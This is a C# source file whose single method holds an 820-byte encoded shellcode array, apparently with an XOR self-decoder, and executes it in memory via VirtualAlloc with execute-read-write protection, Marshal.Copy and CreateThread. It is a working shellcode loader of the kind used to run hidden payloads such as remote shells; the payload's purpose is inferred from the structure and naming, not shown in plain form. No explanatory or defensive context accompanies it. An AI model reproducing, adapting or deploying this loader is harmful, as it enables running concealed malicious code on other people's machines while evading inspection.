using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace ManagedLib1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr
        lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        public static void runner()
        {
            byte[] buf = new byte[820] { 0xeb, 0x27, 0x5b, 0x53, 0x5f, 0xb0, 0xb1, 0xfc, 0xae, 0x75, 0xfd, 0x57, 0x59, 0x53, 0x5e, 0x8a, 0x06, 0x30, 0x07, 0x48, 0xff, 0xc7, 0x48, 0xff, 0xc6, 0x66, 0x81, 0x3f, 0x8b, 0xa8, 0x74, 0x07, 0x80, 0x3e, 0xb1, 0x75, 0xea, 0xeb, 0xe6, 0xff, 0xe1, 0xe8, 0xd4, 0xff, 0xff, 0xff, 0x06, 0x07, 0xb1, 0xfa, 0x4f, 0x85, 0xe3, 0xf6, 0xef, 0xca, 0x07, 0x06, 0x07, 0x47, 0x56, 0x47, 0x57, 0x54, 0x56, 0x50, 0x4f, 0x37, 0xd5, 0x63, 0x4f, 0x8d, 0x55, 0x66, 0x4f, 0x8d, 0x55, 0x1e, 0x4f, 0x8d, 0x55, 0x26, 0x4f, 0x8d, 0x75, 0x56, 0x4f, 0x09, 0xb0, 0x4c, 0x4d, 0x4b, 0x36, 0xcf, 0x4f, 0x37, 0xc7, 0xaa, 0x3b, 0x67, 0x7b, 0x04, 0x2b, 0x26, 0x46, 0xc7, 0xce, 0x0b, 0x46, 0x07, 0xc6, 0xe4, 0xea, 0x54, 0x46, 0x57, 0x4f, 0x8d, 0x55, 0x26, 0x8c, 0x44, 0x3b, 0x4e, 0x06, 0xd6, 0x61, 0x87, 0x7f, 0x1e, 0x0c, 0x04, 0x08, 0x83, 0x75, 0x06, 0x07, 0x06, 0x8c, 0x86, 0x8f, 0x06, 0x07, 0x06, 0x4f, 0x83, 0xc7, 0x72, 0x60, 0x4e, 0x06, 0xd6, 0x57, 0x8d, 0x4f, 0x1e, 0x43, 0x8d, 0x47, 0x26, 0x4e, 0x07, 0xd7, 0xe5, 0x51, 0x4e, 0xf8, 0xcf, 0x46, 0x8d, 0x33, 0x8e, 0x4f, 0x07, 0xd1, 0x4b, 0x36, 0xcf, 0x4f, 0x37, 0xc7, 0xaa, 0x46, 0xc7, 0xce, 0x0b, 0x46, 0x07, 0xc6, 0x3e, 0xe7, 0x73, 0xf6, 0x4a, 0x04, 0x4a, 0x23, 0x0e, 0x42, 0x3f, 0xd6, 0x73, 0xdf, 0x5e, 0x43, 0x8d, 0x47, 0x22, 0x4e, 0x07, 0xd7, 0x60, 0x46, 0x8d, 0x0b, 0x4e, 0x43, 0x8d, 0x47, 0x1a, 0x4e, 0x07, 0xd7, 0x47, 0x8c, 0x02, 0x8f, 0x4e, 0x06, 0xd6, 0x46, 0x5e, 0x46, 0x5e, 0x59, 0x5f, 0x5d, 0x47, 0x5f, 0x47, 0x5e, 0x47, 0x5d, 0x4e, 0x84, 0xea, 0x27, 0x47, 0x55, 0xf9, 0xe7, 0x5e, 0x46, 0x5f, 0x5d, 0x4e, 0x8c, 0x14, 0xee, 0x4d, 0xf8, 0xf9, 0xf8, 0x5b, 0x4f, 0x37, 0xdc, 0x55, 0x4e, 0xb8, 0x70, 0x6f, 0x69, 0x6f, 0x69, 0x63, 0x73, 0x06, 0x46, 0x50, 0x4f, 0x8f, 0xe6, 0x4f, 0xc0, 0xc4, 0x4b, 0x71, 0x21, 0x01, 0xf8, 0xd3, 0x54, 0x55, 0x4f, 0x8f, 0xe6, 0x55, 0x5d, 0x4b, 0x36, 0xc6, 0x4a, 0x37, 0xce, 0x55, 0x54, 0x4f, 0xbd, 0x3c, 0x51, 0x7f, 0xa0, 0x06, 0x07, 0x06, 0x07, 0xf9, 0xd2, 0xee, 0x09, 0x06, 0x07, 0x06, 0x36, 0x3f, 0x35, 0x28, 0x36, 0x30, 0x3f, 0x28, 0x33, 0x3f, 0x29, 0x33, 0x35, 0x06, 0x5d, 0x4e, 0x8e, 0xc7, 0x4e, 0xc1, 0xc7, 0xbd, 0x06, 0x06, 0x07, 0x4b, 0x36, 0xcf, 0x54, 0x55, 0x6d, 0x05, 0x54, 0x4f, 0xbd, 0x51, 0x8e, 0x99, 0xc1, 0x06, 0x07, 0x06, 0x07, 0xf9, 0xd2, 0xee, 0xdf, 0x06, 0x07, 0x06, 0x28, 0x62, 0x62, 0x5f, 0x4a, 0x53, 0x52, 0x6c, 0x6f, 0x50, 0x4a, 0x30, 0x60, 0x6a, 0x4c, 0x41, 0x50, 0x71, 0x4f, 0x75, 0x75, 0x44, 0x70, 0x63, 0x5e, 0x56, 0x62, 0x73, 0x53, 0x4e, 0x30, 0x50, 0x64, 0x67, 0x3f, 0x76, 0x43, 0x40, 0x6f, 0x43, 0x71, 0x31, 0x70, 0x5f, 0x5d, 0x54, 0x74, 0x49, 0x3f, 0x7f, 0x30, 0x60, 0x72, 0x72, 0x3f, 0x2b, 0x53, 0x51, 0x7d, 0x68, 0x6c, 0x3f, 0x53, 0x51, 0x2a, 0x6e, 0x71, 0x48, 0x76, 0x64, 0x77, 0x34, 0x2a, 0x36, 0x43, 0x71, 0x53, 0x6f, 0x6c, 0x72, 0x49, 0x6d, 0x7f, 0x7c, 0x65, 0x41, 0x46, 0x33, 0x4e, 0x36, 0x61, 0x33, 0x4f, 0x7c, 0x6c, 0x32, 0x5d, 0x36, 0x4e, 0x72, 0x72, 0x31, 0x49, 0x6e, 0x7e, 0x7c, 0x64, 0x41, 0x56, 0x67, 0x36, 0x59, 0x4b, 0x49, 0x60, 0x75, 0x46, 0x49, 0x44, 0x7c, 0x30, 0x5f, 0x51, 0x6b, 0x51, 0x57, 0x5f, 0x45, 0x30, 0x41, 0x51, 0x4b, 0x71, 0x53, 0x31, 0x71, 0x44, 0x7f, 0x54, 0x7e, 0x6e, 0x65, 0x52, 0x54, 0x4b, 0x5c, 0x54, 0x71, 0x36, 0x31, 0x71, 0x5f, 0x70, 0x52, 0x36, 0x6c, 0x4d, 0x7c, 0x34, 0x76, 0x3e, 0x4d, 0x45, 0x31, 0x36, 0x49, 0x6a, 0x41, 0x4b, 0x31, 0x4a, 0x31, 0x71, 0x75, 0x52, 0x61, 0x56, 0x74, 0x37, 0x6a, 0x6f, 0x69, 0x4e, 0x52, 0x35, 0x77, 0x54, 0x73, 0x37, 0x40, 0x43, 0x34, 0x58, 0x4e, 0x6e, 0x56, 0x62, 0x4e, 0x64, 0x47, 0x31, 0x7e, 0x32, 0x4b, 0x50, 0x6c, 0x37, 0x71, 0x70, 0x5c, 0x6d, 0x5f, 0x52, 0x4c, 0x3f, 0x06, 0x4f, 0x8f, 0xc6, 0x55, 0x5d, 0x47, 0x5f, 0x4b, 0x36, 0xcf, 0x54, 0x4e, 0xbf, 0x06, 0x35, 0xae, 0x83, 0x06, 0x07, 0x06, 0x07, 0x56, 0x54, 0x55, 0x4e, 0xc1, 0xc5, 0xed, 0x52, 0x28, 0x3c, 0xf9, 0xd2, 0x4e, 0x8e, 0xc0, 0x6d, 0x0c, 0x58, 0x4e, 0x8e, 0xf7, 0x6d, 0x19, 0x5d, 0x54, 0x6f, 0x86, 0x34, 0x06, 0x07, 0x4f, 0x8e, 0xe6, 0x6d, 0x02, 0x46, 0x5f, 0x4e, 0xbc, 0x72, 0x40, 0x99, 0x80, 0x07, 0x06, 0x07, 0x06, 0xf8, 0xd3, 0x4a, 0x37, 0xc7, 0x55, 0x5d, 0x4e, 0x8e, 0xf7, 0x4a, 0x37, 0xce, 0x4b, 0x36, 0xcf, 0x54, 0x55, 0x4e, 0xc1, 0xc5, 0x2b, 0x01, 0x1e, 0x7c, 0xf9, 0xd2, 0x83, 0xc7, 0x73, 0x18, 0x4e, 0xc0, 0xc7, 0x8f, 0x15, 0x07, 0x06, 0x4e, 0xbc, 0x43, 0xf6, 0x32, 0xe6, 0x07, 0x06, 0x07, 0x06, 0xf8, 0xd3, 0x4f, 0xf9, 0xc8, 0x72, 0x05, 0xed, 0xad, 0xee, 0x52, 0x06, 0x07, 0x06, 0x54, 0x5f, 0x6d, 0x46, 0x5d, 0x4f, 0x8e, 0xd7, 0xc6, 0xe4, 0x17, 0x4f, 0xc0, 0xc6, 0x07, 0x16, 0x07, 0x06, 0x4e, 0xbc, 0x5f, 0xa2, 0x54, 0xe3, 0x07, 0x06, 0x07, 0x06, 0xf8, 0xd3, 0x4f, 0x95, 0x54, 0x55, 0x4f, 0x8f, 0xe0, 0x4e, 0x8e, 0xf7, 0x4f, 0x8f, 0xdd, 0x4f, 0xc0, 0xc6, 0x07, 0x26, 0x07, 0x06, 0x4e, 0x8f, 0xfe, 0x4f, 0xbd, 0x14, 0x91, 0x8f, 0xe5, 0x06, 0x07, 0x06, 0x07, 0xf9, 0xd2, 0x4e, 0x84, 0xc2, 0x27, 0x83, 0xc7, 0x72, 0xb5, 0x60, 0x8c, 0x01, 0x4f, 0x07, 0xc4, 0x83, 0xc7, 0x73, 0xd5, 0x5e, 0xc4, 0x5e, 0x6d, 0x06, 0x5e, 0x4f, 0xc0, 0xc4, 0xf7, 0xb3, 0xa5, 0x50, 0xf8, 0xd3, 0x8b, 0xa8 };
            IntPtr shelly_addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, shelly_addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, shelly_addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF); 
        }
    }
}
